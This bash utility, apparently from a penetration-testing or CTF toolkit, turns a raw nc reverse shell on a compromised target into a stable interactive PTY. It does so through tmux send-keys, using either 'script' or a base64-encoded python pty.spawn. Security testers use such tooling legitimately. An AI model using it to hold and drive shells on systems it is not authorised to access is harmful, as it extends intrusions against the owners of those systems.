#!/usr/bin/env bash
# Upgrade an unstabilized reverse shell (a raw `nc` shell in tmux <session>:<win>) to a real
# PTY with job control + a correct window size, in ONE call. A raw nc shell has no job control
# (Ctrl-C kills it), no tab-complete, and wraps output mid-line -- which is exactly the state
# that makes a web-RCE foothold drift into hand-poked one-liners. Run this the MOMENT the shell
# lands, then drive it with scripts/vm-rsh.sh.
#
# Usage: bash vm-stabilize.sh [--win shell] [--cols 220] [--rows 50] [--python] [--dry-run] <session>
#   bash vm-stabilize.sh --win shell <eng>
#
# Default upgrade = `script -qc /bin/bash /dev/null` (no shell-quoting, works on most Linux). Use
# --python to force the `python3 -c 'pty.spawn'` path instead (targets without util-linux `script`).
# FULL raw-mode upgrade (arrow keys / vim) is a MANUAL step after `tmux attach -t <session>`: press
# Ctrl-Z, run `stty raw -echo; fg` in the kali pane, Enter twice, then `export TERM=xterm` on target.
# See wiki [[reverse-shells]] (## TTY Upgrade). VM_SH overridable for tests.
set -uo pipefail
VM_SH="${VM_SH:-/root/vm.sh}"
WIN="shell"; COLS=220; ROWS=50; DRY=0; USE_PY=0
while [ $# -gt 0 ]; do
  case "${1:-}" in
    --win) WIN="${2:?--win needs a name}"; shift 2;;
    --cols) COLS="${2:?--cols needs a number}"; shift 2;;
    --rows) ROWS="${2:?--rows needs a number}"; shift 2;;
    --python) USE_PY=1; shift;;
    --dry-run) DRY=1; shift;;
    *) break;;
  esac
done
SESSION="${1:?need <session> (the engagement tmux session name)}"

if [ "$USE_PY" -eq 1 ]; then
  # python pty spawn, base64-wrapped so its quotes survive the vm.sh -> ssh -> tmux send-keys bridge
  # intact (same trick vm-rsh.sh uses). Decodes to: import pty; pty.spawn("/bin/bash")
  PY_B64="$(printf '%s' 'import pty; pty.spawn("/bin/bash")' | base64 | tr -d '\n')"
  PTY_CMD="echo $PY_B64 | base64 -d | python3"
else
  PTY_CMD='script -qc /bin/bash /dev/null'
fi

# Three clean sends: allocate a PTY, fix TERM, set the window size to match the tmux pane.
SENDS=(
  "$PTY_CMD"
  "export TERM=xterm-256color SHELL=/bin/bash"
  "stty rows $ROWS cols $COLS"
)

for s in "${SENDS[@]}"; do
  if [ "$DRY" -eq 1 ]; then
    printf "tmux send-keys -t %s:%s '%s' Enter\n" "$SESSION" "$WIN" "$s"
  else
    bash "$VM_SH" "tmux send-keys -t $SESSION:$WIN '$s' Enter" >/dev/null 2>&1
    sleep 1
  fi
done

[ "$DRY" -eq 1 ] && exit 0
echo "stabilized $SESSION:$WIN -> pty + ${COLS}x${ROWS}. drive: bash scripts/vm-rsh.sh --win $WIN $SESSION '<cmd>'"
echo "manual raw-mode (arrow keys/vim): tmux attach -t $SESSION ; then Ctrl-Z; stty raw -echo; fg; Enter x2"
